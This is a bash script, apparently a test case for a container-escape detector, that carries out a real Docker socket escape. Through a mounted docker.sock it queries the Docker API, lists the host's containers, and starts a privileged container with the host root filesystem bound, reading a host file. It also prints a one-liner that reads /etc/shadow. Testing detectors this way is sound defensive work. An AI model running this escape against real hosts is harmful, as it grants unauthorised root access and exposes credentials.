#!/bin/bash
# ──────────────────────────────────────────────────────────────────
# ATTACK 1 — Docker Socket Escape (REAL)
#
# Technique:  A container with /var/run/docker.sock mounted uses
#             the Docker API to spawn a NEW privileged container
#             that mounts the entire host root filesystem.
#
# This is one of the most common real-world container escapes.
# If a container has access to the Docker socket, it effectively
# has root on the host.
#
# What the detector should catch:
#   - openat("/var/run/docker.sock")  → docker-socket-open  CRITICAL
#   - connect("/var/run/docker.sock") → docker-socket-connect CRITICAL
# ──────────────────────────────────────────────────────────────────
set -e

RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  REAL ATTACK 1 — Docker Socket Escape                   ║"
echo "║  Running INSIDE a container with docker.sock mounted     ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

echo -e "${CYAN}[INFO]${RESET} PID: $$  UID: $(id -u)  Hostname: $(hostname)"
echo -e "${CYAN}[INFO]${RESET} Checking if Docker socket is accessible..."

if [ ! -S /var/run/docker.sock ]; then
    echo -e "${RED}[FAIL]${RESET} /var/run/docker.sock not found — not vulnerable"
    exit 1
fi

echo -e "${GREEN}[VULN]${RESET} Docker socket IS accessible inside this container!"
echo ""

# ── Step 1: Query Docker API via the socket ────────────────────────
echo -e "${YELLOW}[STEP 1]${RESET} Querying Docker API to prove access..."
echo -e "  curl --unix-socket /var/run/docker.sock http://localhost/version"
DOCKER_VERSION=$(curl -s --unix-socket /var/run/docker.sock http://localhost/version 2>/dev/null | head -c 200)
if [ -n "$DOCKER_VERSION" ]; then
    echo -e "${GREEN}[SUCCESS]${RESET} Docker API responded: ${DOCKER_VERSION:0:80}..."
else
    echo -e "${RED}[BLOCKED]${RESET} Could not query Docker API"
fi
echo ""

# ── Step 2: List host containers (information disclosure) ──────────
echo -e "${YELLOW}[STEP 2]${RESET} Listing host containers via Docker API..."
echo -e "  curl --unix-socket /var/run/docker.sock http://localhost/containers/json"
CONTAINERS=$(curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null | head -c 500)
if [ -n "$CONTAINERS" ]; then
    echo -e "${GREEN}[SUCCESS]${RESET} Enumerated host containers:"
    echo "  $CONTAINERS" | head -c 300
    echo ""
else
    echo -e "${RED}[BLOCKED]${RESET} Could not list containers"
fi
echo ""

# ── Step 3: Attempt to create a privileged container that mounts / ─
echo -e "${YELLOW}[STEP 3]${RESET} Attempting to spawn escape container mounting host root..."
echo -e "  This would run: docker run --privileged -v /:/hostfs alpine cat /hostfs/etc/shadow"

# We use the Docker API directly via curl to create a container
# that mounts the host root filesystem — this is the actual escape.
ESCAPE_PAYLOAD='{
  "Image": "alpine",
  "Cmd": ["cat", "/hostfs/etc/hostname"],
  "HostConfig": {
    "Privileged": true,
    "Binds": ["/:/hostfs:ro"]
  }
}'

CREATE_RESP=$(curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d "$ESCAPE_PAYLOAD" \
    http://localhost/containers/create?name=escape_test_container 2>/dev/null)

CONTAINER_ID=$(echo "$CREATE_RESP" | grep -o '"Id":"[^"]*"' | head -1 | cut -d'"' -f4)

if [ -n "$CONTAINER_ID" ]; then
    echo -e "${GREEN}[SUCCESS]${RESET} Created escape container: ${CONTAINER_ID:0:12}"

    # Start the container
    curl -s --unix-socket /var/run/docker.sock \
        -X POST "http://localhost/containers/$CONTAINER_ID/start" 2>/dev/null

    sleep 1

    # Read output (this would contain host /etc/hostname)
    OUTPUT=$(curl -s --unix-socket /var/run/docker.sock \
        "http://localhost/containers/$CONTAINER_ID/logs?stdout=true&stderr=true" 2>/dev/null)

    if [ -n "$OUTPUT" ]; then
        echo -e "${RED}[ESCAPED]${RESET} Read host file via escape container: $OUTPUT"
    fi

    # Cleanup: remove the escape container
    curl -s --unix-socket /var/run/docker.sock \
        -X DELETE "http://localhost/containers/$CONTAINER_ID?force=true" 2>/dev/null
    echo -e "${CYAN}[CLEANUP]${RESET} Removed escape container"
else
    echo -e "${RED}[BLOCKED]${RESET} Could not create escape container"
    echo "  Response: $CREATE_RESP"
fi

echo ""
echo -e "${RED}[CONCLUSION]${RESET} Docker socket escape: container had FULL HOST ACCESS"
echo -e "  The detector should have fired docker-socket-open and docker-socket-connect alerts."
